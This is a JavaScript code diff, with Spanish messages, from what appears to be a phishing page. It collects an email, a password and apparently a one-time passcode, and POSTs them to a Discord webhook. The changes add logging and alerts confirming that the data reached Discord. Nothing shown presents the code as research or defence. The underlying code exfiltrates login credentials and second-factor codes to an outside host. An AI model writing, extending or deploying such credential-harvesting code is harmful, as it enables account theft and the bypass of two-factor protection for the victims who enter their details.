@@ -36,6 +36,8 @@ OTP
 Esperando...
             `;
 
+            console.log('Enviando mensaje a Discord:', message);
+
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {
@@ -46,9 +48,11 @@ Esperando...
             .then(response => response.json())
             .then(data => {
                 console.log('Éxito:', data);
+                alert('Datos enviados exitosamente a Discord.');
             })
             .catch((error) => {
-                console.error('Error:', error);
+                console.error('Error al enviar datos a Discord:', error);
+                alert('Ocurrió un error al enviar los datos a Discord.');
             });
         } else {
             alert('Por favor, ingresa tanto el correo electrónico como la contraseña.');
